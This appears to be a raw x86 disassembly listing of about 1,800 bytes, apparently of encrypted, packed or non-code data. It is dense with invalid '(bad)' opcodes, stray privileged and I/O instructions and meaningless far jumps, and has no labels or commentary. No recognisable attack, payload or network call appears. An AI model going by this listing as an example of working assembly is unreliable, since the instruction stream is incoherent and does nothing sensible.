  421d00:	add    al,0xe
  421d02:	(bad)  
  421d03:	push   cs
  421d04:	sbb    eax,0xef94bdd7
  421d09:	int    0x63
  421d0b:	mov    ds:0x308dfd43,al
  421d10:	loope  0x421c9b
  421d12:	cs jae 0x421ce0
  421d15:	fisttp DWORD PTR [esi-0x45cce29e]
  421d1b:	ret    0x842
  421d1e:	fwait
  421d1f:	mov    dl,0xd0
  421d21:	lahf   
  421d22:	test   BYTE PTR [ebp+0x3f],ah
  421d25:	test   BYTE PTR [eax-0x6737ba82],al
  421d2b:	stos   BYTE PTR es:[edi],al
  421d2c:	mov    edx,0x1020eede
  421d31:	aad    0x7c
  421d33:	and    eax,0x235d04e
  421d38:	outs   dx,DWORD PTR ds:[esi]
  421d39:	xor    BYTE PTR [esi-0x310ffd32],0x5b
  421d40:	mov    ebp,0x7f61f5cb
  421d45:	push   ss
  421d46:	das    
  421d47:	mov    eax,ds:0xcec4237
  421d4c:	outs   dx,BYTE PTR ds:[esi]
  421d4d:	cmp    eax,0xc875a524
  421d52:	jg     0x421d16
  421d54:	int3   
  421d55:	imul   ecx,DWORD PTR [ecx],0xca5ec638
  421d5b:	push   esp
  421d5c:	inc    esp
  421d5d:	inc    edi
  421d5e:	retf   
  421d5f:	sub    esi,DWORD PTR [eax]
  421d61:	push   esp
  421d62:	xor    bh,BYTE PTR [edx+0x41]
  421d65:	xor    ebp,DWORD PTR [ebx]
  421d67:	push   es
  421d68:	hlt    
  421d69:	sub    al,0xef
  421d6b:	mov    eax,0x10ad7393
  421d70:	mov    bl,0xa0
  421d72:	push   eax
  421d73:	jno    0x421d5c
  421d75:	(bad)
  421d79:	mov    edx,0x65150aab
  421d7e:	sub    ch,BYTE PTR [ebp-0x37]
  421d81:	in     al,0xa9
  421d83:	or     DWORD PTR [edi],esi
  421d85:	adc    bh,ah
  421d87:	mov    DWORD PTR [esi+0x7ac373d2],eax
  421d8d:	in     eax,0x2a
  421d8f:	jb     0x421d27
  421d91:	lahf   
  421d92:	dec    esi
  421d93:	loope  0x421d3b
  421d95:	ins    DWORD PTR es:[edi],dx
  421d96:	mov    eax,ds:0x5caaebd3
  421d9b:	jge    0x421dec
  421d9d:	inc    esi
  421d9e:	cmp    BYTE PTR [esi-0x64fe1d26],cl
  421da4:	inc    esp
  421da5:	outs   dx,DWORD PTR ds:[esi]
  421da6:	xor    DWORD PTR ds:0x90c57585,eax
  421dac:	push   ss
  421dad:	xchg   ebp,eax
  421dae:	mov    DWORD PTR [edi+0x4246af7d],0x6a393155
  421db8:	jo     0x421e05
  421dba:	and    edx,DWORD PTR [ebx]
  421dbc:	cmp    al,0x2b
  421dbe:	repz mov edi,0xd2c19852
  421dc4:	or     DWORD PTR [eax+ecx*4],0xffffffbb
  421dc8:	and    al,0x20
  421dca:	dec    ecx
  421dcb:	adc    eax,0x6125fe1d
  421dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dd1:	push   es
  421dd2:	rcl    BYTE PTR [ebp-0x21da7953],0x9c
  421dd9:	mov    es,WORD PTR [ebx+0x162c31be]
  421ddf:	pop    ebx
  421de0:	adc    ebp,DWORD PTR [edx+0x3e]
  421de3:	pop    esi
  421de4:	mov    edi,0x564614ea
  421de9:	and    edi,edx
  421deb:	mov    ah,0x44
  421ded:	adc    al,0x9f
  421def:	push   DWORD PTR [ecx+0xa5eb01f]
  421df5:	ds dec ebx
  421df7:	xor    BYTE PTR [esi],dl
  421df9:	mov    bh,0xc8
  421dfb:	pop    esp
  421dfc:	in     al,0xaa
  421dfe:	data16 (bad) 
  421e00:	fcmovnbe st,st(4)
  421e02:	sbb    ebp,DWORD PTR [ebp-0x16]
  421e05:	mov    ebx,0x898e785a
  421e0a:	(bad)  
  421e0b:	pop    edi
  421e0c:	shl    DWORD PTR [ebx],cl
  421e0e:	adc    BYTE PTR [ebx],cl
  421e10:	dec    edx
  421e11:	(bad)  
  421e12:	sar    bl,0x35
  421e15:	shl    eax,1
  421e17:	xchg   esp,eax
  421e18:	lahf   
  421e19:	in     eax,0x3c
  421e1b:	adc    al,0x66
  421e1d:	mov    edi,0x60e93ca0
  421e22:	adc    ebx,DWORD PTR [edi-0x26b7c2d1]
  421e28:	mov    eax,0x8aaf0fbf
  421e2d:	mov    eax,0xe8db6ce0
  421e32:	dec    eax
  421e33:	dec    ecx
  421e34:	out    dx,al
  421e35:	mov    BYTE PTR [eax-0x12],bh
  421e38:	xor    ecx,DWORD PTR [eax-0x15750000]
  421e3e:	rcr    DWORD PTR [ebx],cl
  421e40:	repz cmp ecx,ebx
  421e43:	cli    
  421e44:	in     al,dx
  421e45:	jg     0x421e7e
  421e47:	loopne 0x421e6a
  421e49:	mov    dh,0xc8
  421e4b:	arpl   WORD PTR [ecx+ebx*4+0x1],di
  421e4f:	add    BYTE PTR [esi-0x2cfffffe],al
  421e55:	repnz push 0x4c
  421e58:	aas    
  421e59:	rep stos BYTE PTR es:[edi],al
  421e5b:	xor    DWORD PTR [edi],edx
  421e5d:	pop    esi
  421e5e:	int3   
  421e5f:	ds mov ch,0xff
  421e62:	dec    edi
  421e63:	(bad)  
  421e64:	rcr    BYTE PTR [edx*4+0x4552e304],1
  421e6b:	xor    edx,edx
  421e6d:	push   eax
  421e6e:	imul   edi,DWORD PTR [eax+ecx*4+0x5e483e6],0xffffffde
  421e76:	mov    eax,DWORD PTR [eax-0x214e2bba]
  421e7c:	cmc    
  421e7d:	or     eax,0x7e9081b
  421e82:	and    BYTE PTR [edx+0x5443c8b8],cl
  421e88:	mov    ds:0x344c5e1d,eax
  421e8d:	xchg   ebp,eax
  421e8e:	icebp  
  421e8f:	bound  edx,QWORD PTR [eax-0x7c]
  421e92:	mov    al,ds:0x73043b50
  421e97:	inc    esp
  421e98:	dec    eax
  421e99:	inc    edx
  421e9a:	and    ch,BYTE PTR [edi+0x6e]
  421e9d:	lods   eax,DWORD PTR ds:[esi]
  421e9e:	or     eax,0x7edba0c5
  421ea3:	push   ds
  421ea4:	fcmovnb st,st(5)
  421ea6:	mov    ecx,0x60bd2e88
  421eab:	stos   DWORD PTR es:[edi],eax
  421eac:	ins    BYTE PTR es:[edi],dx
  421ead:	clc    
  421eae:	xor    edx,DWORD PTR [esi-0x49]
  421eb1:	inc    ecx
  421eb2:	loopne 0x421ed7
  421eb4:	and    BYTE PTR [edx-0x77c60c78],0xfc
  421ebb:	arpl   WORD PTR [edx-0x10],bp
  421ebe:	push   ecx
  421ebf:	aam    0x27
  421ec1:	ss adc ecx,DWORD PTR cs:[edx-0x687e728b]
  421ec9:	push   ebx
  421eca:	jbe    0x421ecb
  421ecc:	imul   ebx,DWORD PTR [eax],0x5
  421ecf:	ja     0x421e9b
  421ed1:	pop    ds
  421ed2:	cdq    
  421ed3:	dec    ebp
  421ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ed5:	mov    bh,0xc8
  421ed7:	lahf   
  421ed8:	retf   0x3b6c
  421edb:	add    bl,BYTE PTR [esp+ebx*2]
  421ede:	lahf   
  421edf:	cdq    
  421ee0:	dec    eax
  421ee1:	aad    0xb6
  421ee3:	pop    edx
  421ee4:	dec    edi
  421ee5:	xchg   ecx,eax
  421ee6:	mov    ds,ebp
  421ee8:	jo     0x421ee1
  421eea:	pop    DWORD PTR [eax]
  421eec:	adc    eax,0x280d4058
  421ef1:	lock mov bh,0x55
  421ef4:	xchg   edi,eax
  421ef5:	into   
  421ef6:	xor    BYTE PTR [ebx+0x48890c72],ch
  421efc:	sar    BYTE PTR [ebx+0x2579adf],cl
  421f02:	js     0x421f6e
  421f04:	iret   
  421f05:	or     dl,BYTE PTR [ebx-0x2e406da1]
  421f0b:	push   0xffffff9b
  421f0d:	shl    DWORD PTR [eax+0x86bf439],cl
  421f13:	sub    ah,dh
  421f15:	in     eax,dx
  421f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f17:	stos   DWORD PTR es:[edi],eax
  421f18:	inc    ebp
  421f19:	inc    esi
  421f1a:	mov    ah,0x15
  421f1c:	pop    eax
  421f1d:	dec    ebx
  421f1e:	jae    0x421ef9
  421f20:	and    eax,0x3e38fd45
  421f25:	imul   BYTE PTR [edx+0x1524aabc]
  421f2b:	fldcw  WORD PTR [ebp+eax*2-0x1b9c742f]
  421f32:	sbb    DWORD PTR [ecx+0x3f],edi
  421f35:	jae    0x1e245802
  421f3b:	push   0xffffffbc
  421f3d:	pushf  
  421f3e:	mov    ebp,0x4c6968d4
  421f43:	repz sub ecx,DWORD PTR [esi+0x22387fa]
  421f4a:	scas   al,BYTE PTR es:[edi]
  421f4b:	pop    es
  421f4c:	mov    esi,0xb0c3de74
  421f51:	dec    edi
  421f52:	ins    BYTE PTR es:[edi],dx
  421f53:	imul   ecx,DWORD PTR [ebx],0x4461adcc
  421f59:	int    0x7f
  421f5b:	push   esp
  421f5c:	icebp  
  421f5d:	out    dx,al
  421f5e:	hlt    
  421f5f:	sub    ebx,DWORD PTR [esi-0x5367bbee]
  421f65:	mov    al,0x4a
  421f67:	push   edi
  421f68:	push   ss
  421f69:	cmp    WORD PTR [esi+0x61],sp
  421f6d:	push   ebp
  421f6e:	mov    esi,0xdb568ccb
  421f73:	out    0x88,eax
  421f75:	adc    eax,0xda1adcc1
  421f7a:	scas   eax,DWORD PTR es:[edi]
  421f7b:	stos   WORD PTR es:[edi],ax
  421f7d:	add    al,0x43
  421f7f:	loope  0x421f3d
  421f81:	sti    
  421f82:	out    0xed,al
  421f84:	clc    
  421f85:	rcr    DWORD PTR [esi+0x16],1
  421f88:	xchg   edi,eax
  421f89:	adc    eax,0xf64f6ee8
  421f8e:	pop    esp
  421f8f:	aaa    
  421f90:	pop    ebp
  421f91:	adc    al,0x5e
  421f93:	(bad)  
  421f94:	repnz mov ecx,0xe0c47c69
  421f9a:	push   edx
  421f9b:	mov    dh,0x64
  421f9d:	dec    ebp
  421f9e:	adc    al,BYTE PTR [ebp-0xd]
  421fa1:	cwde   
  421fa2:	in     al,0xce
  421fa4:	cmc    
  421fa5:	adc    esi,DWORD PTR [ebp+0x50ae9bea]
  421fab:	cmp    sp,WORD PTR [ebx]
  421fae:	and    al,BYTE PTR [ebp+esi*2+0x1]
  421fb2:	cmp    dl,bh
  421fb4:	(bad)
  421fb9:	inc    BYTE PTR [ebx+0x34f19cdc]
  421fbf:	mov    ebp,0xee094b68
  421fc4:	imul   edx,DWORD PTR [ebx-0x10],0xf6ce3e15
  421fcb:	sbb    eax,0x939fc2a6
  421fd0:	or     DWORD PTR [esi+0x44c42e3c],esp
  421fd6:	push   edi
  421fd7:	imul   ecx,esp,0x4d8dec5f
  421fdd:	mov    ebx,0xd1b381c6
  421fe2:	mov    eax,0xa887acff
  421fe7:	sbb    cl,BYTE PTR [edi+0x6b]
  421fea:	cmp    dl,ch
  421fec:	bound  ecx,QWORD PTR [ebx]
  421fee:	cmp    ch,al
  421ff0:	xor    BYTE PTR [esi+0x7041910],al
  421ff6:	add    eax,0xfb5d6da3
  421ffb:	xlat   BYTE PTR ds:[ebx]
  421ffc:	pop    ds
  421ffd:	mov    bl,0x7e
  421fff:	test   eax,0x97d28935
  422004:	pushf  
  422005:	int    0xee
  422007:	ja     0x421fdf
  422009:	jbe    0x422063
  42200b:	aad    0x1b
  42200d:	call   0x2c45:0xa418e4f9
  422014:	jb     0x421fe2
  422016:	cmc    
  422017:	dec    ecx
  422018:	add    dl,BYTE PTR [edi+0xa]
  42201b:	imul   esi,DWORD PTR [ecx-0x2c],0x4e
  42201f:	inc    eax
  422020:	bound  edx,QWORD PTR [eax]
  422022:	and    BYTE PTR [edx-0x77d13e94],0x4a
  422029:	shl    BYTE PTR [eax+ebp*4],cl
  42202c:	mov    WORD PTR [esi],fs
  42202e:	jns    0x422050
  422030:	shl    ah,0x8c
  422033:	div    esi
  422035:	test   bl,dl
  422037:	jmp    0x422096
  422039:	icebp  
  42203a:	mov    bl,0x2b
  42203c:	adc    DWORD PTR [eax-0x65aebd73],edx
  422042:	in     eax,dx
  422043:	push   ebp
  422044:	inc    ecx
  422045:	clc    
  422046:	lahf   
  422047:	sbb    ah,cl
  422049:	call   0x323:0x94a4e8ca
  422050:	and    eax,0x41d1a9c9
  422055:	push   ds
  422056:	or     ah,dl
  422058:	imul   BYTE PTR [edi+0x2a]
  42205b:	in     eax,dx
  42205c:	test   esp,esp
  42205e:	add    eax,edi
  422060:	xor    BYTE PTR [eax-0x4eb64a7a],ah
  422066:	(bad)  
  422067:	arpl   WORD PTR [ebp+0x3e],si
  42206a:	stos   DWORD PTR es:[edi],eax
  42206b:	lahf   
  42206c:	cmp    esp,eax
  42206e:	(bad)  [esi*1+0x7b14f366]
  422075:	sub    BYTE PTR [esi],cl
  422077:	repz pop ds
  422079:	aam    0x82
  42207b:	ror    DWORD PTR [esi+0x3b368cf2],0xf2
  422082:	pushf  
  422083:	ret    
  422084:	out    dx,al
  422085:	add    ebx,0x2
  422088:	and    bh,BYTE PTR [ecx]
  42208a:	pop    ebx
  42208b:	and    eax,0x2dc68bbc
  422090:	push   ebx
  422091:	jbe    0x42202a
  422093:	outs   dx,BYTE PTR ds:[esi]
  422094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422095:	aas    
  422096:	test   cl,ch
  422098:	and    eax,0xd3010861
  42209d:	add    DWORD PTR [edi+0x73],ecx
  4220a0:	mov    bl,0x75
  4220a2:	sbb    BYTE PTR [esi+0x52],dh
  4220a5:	mov    ch,0xe0
  4220a7:	aam    0xe7
  4220a9:	test   al,0xad
  4220ab:	and    esi,DWORD PTR [edi+0x7d]
  4220ae:	retf   
  4220af:	out    dx,eax
  4220b0:	adc    BYTE PTR ds:0x842608ae,ah
  4220b6:	or     eax,0x66c60c7d
  4220bb:	popa   
  4220bc:	mov    esp,0x53bfd49a
  4220c1:	pop    esp
  4220c2:	xor    al,0x3e
  4220c4:	xchg   edi,eax
  4220c5:	bound  edx,QWORD PTR [ebx-0x1c]
  4220c8:	pop    edi
  4220c9:	dec    eax
  4220ca:	jmp    0x422062
  4220cc:	imul   edx,DWORD PTR [edx+0xa],0xffffff90
  4220d0:	inc    esi
  4220d1:	outs   dx,BYTE PTR ds:[esi]
  4220d2:	sahf   
  4220d3:	dec    edx
  4220d4:	jg     0x4220cd
  4220d6:	fwait
  4220d7:	int    0xf2
  4220d9:	pop    esi
  4220da:	add    BYTE PTR [eax],al
  4220dc:	shl    BYTE PTR [edx],cl
  4220de:	xchg   esi,eax
  4220df:	call   0x1e52:0x6adebef6
  4220e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e7:	and    dh,BYTE PTR [edi+0x2f82a91]
  4220ed:	pushf  
  4220ee:	add    DWORD PTR [eax],eax
  4220f0:	xchg   BYTE PTR [edx],al
  4220f2:	add    BYTE PTR [eax],al
  4220f4:	adc    ah,dl
  4220f6:	push   edi
  4220f7:	inc    edx
  4220f8:	xchg   edi,eax
  4220f9:	jle    0x42214a
  4220fb:	sub    bh,BYTE PTR ds:0x7c4f104a
  422101:	jnp    0x4220b5
  422103:	xchg   ecx,eax
  422104:	(bad)  
  422105:	mov    edx,0x94f838b2
  42210a:	xchg   edx,eax
  42210b:	sbb    eax,0x9efa49ad
  422110:	les    esi,FWORD PTR [ebx]
  422112:	les    eax,FWORD PTR [edx-0x266c02f9]
  422118:	(bad)  [esi-0x60]
  42211b:	test   al,0xfe
  42211d:	ficomp WORD PTR [ebx+0x0]
  422120:	ret    
  422121:	lahf   
  422122:	iret   
  422123:	push   esp
  422124:	push   eax
  422125:	mov    eax,ds:0x741fbe87
  42212a:	in     eax,0x29
  42212c:	imul   edi,DWORD PTR [eax+0x41ea910a],0x6dc90030
  422136:	push   ds
  422137:	ret    
  422138:	cmp    al,0x5a
  42213a:	sub    ecx,DWORD PTR [esi-0x27ff1d40]
  422140:	int    0x3
  422142:	inc    ebx
  422143:	jl     0x4221a6
  422145:	sahf   
  422146:	into   
  422147:	jl     0x4221b0
  422149:	mov    ch,cl
  42214b:	jmp    0x518dbd58
  422150:	push   ebx
  422151:	or     eax,0x8f68b139
  422156:	or     cl,BYTE PTR [ebx+0x32d0fb3b]
  42215c:	enter  0x4b32,0x10
  422160:	jmp    0x6ef4:0x92c53b51
  422167:	jmp    0x42218c
  422169:	inc    ebx
  42216a:	mov    dh,0x9e
  42216c:	and    al,0x1b
  42216e:	jno    0x42219a
  422170:	mov    edx,0xd8f4ecdb
  422175:	sub    BYTE PTR [ebp-0x6a08b6e4],ch
  42217b:	test   al,0x6c
  42217d:	xor    al,0x1a
  42217f:	xchg   ecx,eax
  422180:	push   0xffffffde
  422182:	sbb    BYTE PTR [eax+0x57],bh
  422185:	repnz das 
  422187:	retf   
  422188:	jmp    0x4e8:0xa37eb5b2
  42218f:	and    BYTE PTR [edx-0xa9452f4],0x8c
  422196:	cmp    eax,0xea4dd248
  42219b:	pop    es
  42219c:	daa    
  42219d:	sub    cl,0x76
  4221a0:	retf   
  4221a1:	xor    DWORD PTR [ecx-0x7c],eax
  4221a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221a5:	hlt    
  4221a6:	(bad)  
  4221a7:	scas   eax,DWORD PTR es:[edi]
  4221a8:	ror    DWORD PTR [edi],1
  4221aa:	mov    al,0x9f
  4221ac:	pop    ecx
  4221ad:	sbb    eax,0x484c050b
  4221b2:	inc    ecx
  4221b3:	loop   0x422148
  4221b5:	pop    ebx
  4221b6:	sub    BYTE PTR [edx-0x324108fc],al
  4221bc:	dec    edx
  4221bd:	loop   0x422227
  4221bf:	or     eax,ebp
  4221c1:	sub    DWORD PTR [ebp+0x3eeaa46d],esp
  4221c7:	mov    ecx,0x10b8c7d8
  4221cc:	dec    esi
  4221cd:	pushf  
  4221ce:	pop    edx
  4221cf:	xchg   esp,eax
  4221d0:	mov    eax,ds:0x82fc76b7
  4221d5:	fidivr DWORD PTR [eax+0x66314339]
  4221db:	loopne 0x4221d0
  4221dd:	pop    es
  4221de:	fist   DWORD PTR [ebp+0x5d3df81]
  4221e4:	fcom   QWORD PTR [edi]
  4221e7:	dec    edx
  4221e8:	repnz (bad) 
  4221ea:	in     eax,dx
  4221eb:	aaa    
  4221ec:	and    DWORD PTR [edx+0x10],ebp
  4221ef:	int3   
  4221f0:	js     0x42225a
  4221f2:	mov    eax,0xb5718a28
  4221f7:	mov    DWORD PTR [eax-0x76],esi
  4221fa:	mov    bh,0x7d
  4221fc:	(bad)  
  4221fe:	cmp    BYTE PTR [eax],dh
  422200:	pushf  
  422201:	aam    0x4a
  422203:	xchg   esp,eax
  422204:	push   esi
  422205:	(bad)  
  422206:	cdq    
  422207:	scas   al,BYTE PTR es:[edi]
  422208:	jne    0x42226e
  42220a:	adc    eax,0x3f1f379e
  42220f:	mov    ebx,0x69743713
  422214:	lock jno 0x422228
  422217:	(bad)  [eax+0x536d5782]
  42221d:	sub    ecx,DWORD PTR [edi+edi*2]
  422220:	pause  
  422222:	mov    dh,ch
  422224:	stos   BYTE PTR es:[edi],al
  422225:	aad    0x51
  422227:	mov    WORD PTR [esi+ecx*2],?
  42222a:	pusha  
  42222b:	lahf   
  42222c:	jae    0x4221b9
  42222e:	aam    0xd4
  422230:	aas    
  422231:	test   al,0x81
  422233:	sub    BYTE PTR [ebx+0x511309b0],ch
  422239:	pop    ds
  42223a:	cld    
  42223b:	mov    dh,0xfd
  42223d:	lock out 0xb0,al
  422240:	mov    ah,dl
  422242:	pop    DWORD PTR [edx-0xd]
  422245:	or     BYTE PTR [edi+0x77659fdb],bh
  42224b:	xchg   DWORD PTR [ebp-0x7c],ebp
  42224e:	out    0x13,al
  422250:	jmp    0x23e0:0x21a0d18a
  422257:	xchg   esi,eax
  422258:	ds mov dh,0xb3
  42225b:	or     al,0xe6
  42225d:	push   esp
  42225e:	nop
  42225f:	retf   0x5504
  422262:	dec    ebx
  422263:	xchg   edi,eax
  422264:	sbb    bh,dl
  422266:	jae    0x422222
  422268:	pop    esi
  422269:	les    ebp,FWORD PTR [esi+0x44f0723d]
  42226f:	mov    DWORD PTR [eax],0x60529fe9
  422275:	(bad)  
  422276:	push   ecx
  422277:	cmp    eax,DWORD PTR [edi]
  422279:	inc    edx
  42227a:	inc    edi
  42227b:	mov    esp,0x11519812
  422280:	add    ch,BYTE PTR [ebp-0x4e]
  422283:	(bad)  
  422284:	jg     0x422289
  422286:	push   ds
  422287:	jb     0x4222a8
  422289:	mov    esp,eax
  42228b:	or     edx,DWORD PTR [eax-0x36]
  42228e:	xlat   BYTE PTR ds:[ebx]
  42228f:	adc    BYTE PTR [edi+ecx*4-0x205cf438],ah
  422296:	in     eax,dx
  422297:	leave  
  422298:	test   al,0x39
  42229a:	(bad)  
  42229b:	(bad)  
  42229c:	out    0xac,al
  42229e:	into   
  42229f:	add    ebx,ecx
  4222a1:	adc    edi,DWORD PTR [esi+0x1dd8b269]
  4222a7:	cs xchg ebx,eax
  4222a9:	adc    bh,BYTE PTR [edx+0x3b]
  4222ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222ad:	repz cmc 
  4222af:	test   DWORD PTR gs:[ebx-0x1946a5c3],0x2d12de5e
  4222ba:	mov    ebx,0xd4393e02
  4222bf:	ins    DWORD PTR es:[edi],dx
  4222c0:	stos   DWORD PTR es:[edi],eax
  4222c1:	andnps xmm3,XMMWORD PTR [ebx-0x7e11a300]
  4222c8:	(bad)  
  4222c9:	(bad)  
  4222ca:	cwde   
  4222cb:	(bad)  
  4222cc:	jg     0x4222f6
  4222ce:	std    
  4222cf:	cmp    BYTE PTR [ebx+0x57],0xff
  4222d3:	push   edx
  4222d4:	ror    dh,0xbc
  4222d7:	add    ah,bl
  4222d9:	xchg   esp,eax
  4222da:	adc    DWORD PTR [ecx],0x53
  4222dd:	sub    al,0xc9
  4222df:	add    al,0xfd
  4222e1:	fs sub edi,edx
  4222e4:	fiadd  WORD PTR [edx-0x59]
  4222e7:	sahf   
  4222e8:	imul   eax,DWORD PTR [esi],0x48
  4222eb:	sub    eax,0xa4d87cf4
  4222f0:	jge    0x422309
  4222f2:	adc    al,0x1e
  4222f4:	add    ebp,DWORD PTR [ebp+0x5f]
  4222f7:	push   cs
  4222f8:	xchg   ebp,eax
  4222f9:	ds sub al,0xad
  4222fc:	aaa    
  4222fd:	shl    ebp,cl
  4222ff:	mov    dh,BYTE PTR [ecx+0x77]
  422302:	inc    edi
  422303:	cdq    
  422304:	icebp  
  422305:	dec    ebx
  422306:	imul   esi,ebx,0x6ef3a127
  42230c:	ds jae 0x422357
  42230f:	ret    
  422310:	pop    esp
  422311:	loopne 0x422310
  422313:	push   esi
  422314:	sar    BYTE PTR [edi+0x54],cl
  422317:	jb     0x4222f8
  422319:	push   0x58
  42231b:	push   ebx
  42231c:	mov    dl,0x3a
  42231e:	test   BYTE PTR [edx-0x28],cl
  422321:	fldenv [edi-0x57]
  422324:	add    ebp,DWORD PTR [ebp-0x67]
  422327:	xchg   BYTE PTR [edx+0x2272183],ch
  42232d:	pop    ecx
  42232e:	xor    BYTE PTR [edx-0x4c],al
  422331:	rcl    DWORD PTR [eax-0x55],0xda
  422335:	ss loope 0x4222fc
  422338:	push   ebx
  422339:	mov    dh,0xf7
  42233b:	mov    ah,0xb4
  42233d:	mov    al,0x14
  42233f:	call   DWORD PTR [ecx+0x64]
  422342:	push   ds
  422343:	mov    al,0x13
  422345:	fsubr  QWORD PTR [eax]
  422347:	stos   DWORD PTR es:[edi],eax
  422348:	not    DWORD PTR [edi+eiz*8+0x5727d167]
  42234f:	add    eax,0xa60941d
  422354:	popa   
  422355:	ins    DWORD PTR es:[edi],dx
  422356:	sbb    eax,0x67550512
  42235b:	imul   ebx,DWORD PTR [eax+edi*4],0x1b
  42235f:	out    dx,al
  422360:	std    
  422361:	push   0x51b3e643
  422366:	sbb    esi,esp
  422368:	xor    eax,0x1c1543cd
  42236d:	xchg   edx,eax
  42236e:	clc    
  42236f:	int3   
  422370:	popa   
  422371:	inc    ecx
  422372:	xchg   edi,eax
  422373:	retf   0x9341
  422376:	mov    eax,ds:0x4a5a65
  42237b:	add    ch,bl
  42237d:	cmp    al,0x8f
  42237f:	mov    esp,0x7dffbfef
  422384:	add    al,BYTE PTR [ebp+0x1a398dc1]
  42238a:	into   
  42238b:	sbb    ecx,DWORD PTR [eax-0x79fffe62]
  422391:	add    al,BYTE PTR [eax]
  422393:	add    BYTE PTR [edi],dh
  422395:	scas   eax,DWORD PTR es:[edi]
  422396:	xchg   cl,ah
  422398:	sbb    ebx,0x73
  42239b:	or     ebp,ecx
  42239d:	call   DWORD PTR [ebx+eax*4+0x647fe23c]
  4223a4:	cmp    al,0xbc
  4223a6:	cmc    
  4223a7:	mov    ds:0x789cba55,eax
  4223ac:	xor    DWORD PTR [esp+edx*8+0x36],edi
  4223b0:	ss xchg edx,eax
  4223b2:	inc    ebp
  4223b3:	lahf   
  4223b4:	scas   al,BYTE PTR es:[edi]
  4223b5:	xor    ebx,ecx
  4223b7:	fnsave [ecx+ebx*8-0x10791b69]
  4223be:	pop    eax
  4223bf:	mov    WORD PTR [ebx-0x6988a765],ss
  4223c5:	js     0x42243c
  4223c7:	pop    es
  4223c8:	xchg   ebx,eax
  4223c9:	mov    ds:0x950d00ae,al
  4223ce:	add    eax,0x8dcd4d55
  4223d3:	das    
  4223d4:	adc    esi,DWORD PTR [edx+0x12650a49]
  4223da:	push   edx
  4223db:	lds    esp,FWORD PTR [ecx]
  4223dd:	(bad)  
  4223de:	cmp    BYTE PTR [ebp-0xabd6ba8],ch
  4223e4:	sbb    ch,ch
  4223e6:	idiv   DWORD PTR [edi]
  4223e8:	mov    BYTE PTR [eax+0x43],bh
  4223eb:	hlt    
  4223ec:	xchg   cl,dl
  4223ee:	(bad)  
  4223ef:	pop    eax
  4223f0:	xor    al,0xdb
  4223f2:	cmp    dl,BYTE PTR [edx+ebx*1]
  4223f5:	xchg   esi,eax
  4223f6:	shl    ebp,cl
  4223f8:	mov    eax,ds:0x17166f3c
  4223fd:	inc    ebp
  4223fe:	arpl   WORD PTR [ebx+0x3d],si
  422401:	(bad)  
  422402:	fstp   QWORD PTR [edx+edi*4-0x1157003b]
  422409:	sar    al,1
  42240b:	jbe    0x4223ff
  42240d:	and    DWORD PTR [edi],ecx
  42240f:	mov    esp,0x226765a3
  422414:	stc    
  422415:	(bad)  
  422417:	sbb    BYTE PTR [edi+edi*1],ah
  42241a:	jecxz  0x422489
  42241c:	call   0x2871:0xbefbef82
  422423:	test   ebx,edx
  422425:	outs   dx,BYTE PTR ds:[esi]
  422426:	xlat   BYTE PTR ds:[ebx]
  422427:	jle    0x42241d
  422429:	inc    eax
  42242a:	mov    ah,0xff
  42242c:	inc    esi
  42242d:	cmp    eax,0xbb7bfc2a
  422432:	push   0x73
  422434:	data16 int3 
  422436:	pop    esp
  422437:	add    eax,esi
  422439:	test   eax,0xf808aff7
  42243e:	push   esi
  42243f:	pcmpgtd mm3,QWORD PTR [esi+0x3105c64b]
  422446:	cdq    
  422447:	cmp    esi,edi
  422449:	loopne 0x422453
  42244b:	les    ebx,FWORD PTR [edi+0x507620b7]
  422451:	fsubp  st(6),st
  422453:	pop    ebx
  422454:	or     al,0xf5
  422456:	mov    bh,0x98
  422458:	ret    
  422459:	cmp    edx,DWORD PTR [eax]
  42245b:	jp     0x422408
  42245d:	fdivrp st(6),st
  42245f:	xchg   edx,eax
  422460:	sbb    ch,cl
  422462:	jmp    0x42241a
  422464:	nop
  422465:	push   esp
  422466:	jbe    0x4224a3
  422468:	cmp    al,0x6b
  42246a:	ret    
  42246b:	test   al,dh
  42246d:	adc    DWORD PTR gs:[ebp+0x4d],edx
  422471:	pop    edx
  422472:	retf   
  422473:	retf   0xab23
  422476:	test   DWORD PTR [esi+0x72],eax
  422479:	jge    0x422402
  42247b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247c:	loop   0x4224ac
  42247e:	mov    dl,0xe2
  422480:	es xchg esp,eax
  422482:	mov    BYTE PTR [ebp+edx*2+0x79e12ba8],0x88
  42248a:	imul   edi,DWORD PTR [ebx],0x999dfada
  422490:	popa   
  422491:	je     0x4224fd
  422493:	mov    BYTE PTR [edi+0x638e5454],bh
  422499:	mov    ebx,esp
  42249b:	pushf  
  42249c:	std    
  42249d:	dec    ebp
  42249e:	out    dx,al
  42249f:	pop    esi
  4224a0:	fwait
  4224a1:	and    dh,BYTE PTR [ecx]
  4224a3:	xchg   ebp,eax
  4224a4:	fisubr WORD PTR [ebx+0x725b5452]
  4224aa:	retf   
  4224ab:	retf   
  4224ac:	in     eax,0x81
  4224ae:	adc    BYTE PTR [ebp+0x5f],dh
  4224b1:	arpl   ax,bx
  4224b3:	call   0x894f1b6f
  4224b8:	(bad)  
  4224b9:	jmp    0xe06d:0xa06c0458
  4224c0:	outs   dx,DWORD PTR ds:[esi]
  4224c1:	dec    eax
  4224c2:	xchg   esp,eax
  4224c3:	adc    al,0xa7
  4224c5:	push   esi
  4224c6:	icebp  
  4224c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c8:	xor    BYTE PTR [ebx],cl
  4224ca:	xchg   ebx,eax
  4224cb:	inc    esi
  4224cc:	cmp    eax,0x55f786e2
  4224d1:	fwait
  4224d2:	js     0x4224e3
  4224d4:	adc    al,0x8c
  4224d6:	fs popf 
  4224d8:	retf   
  4224d9:	inc    esi
  4224da:	call   0xff61ebc3
  4224df:	arpl   WORD PTR [eax],ax
  4224e1:	cmp    BYTE PTR [esi+0x7954b964],dh
  4224e7:	loope  0x4224b7
  4224e9:	inc    esp
  4224ea:	jge    0x422558
  4224ec:	les    esi,FWORD PTR [esi+0x6b]
  4224ef:	push   ss
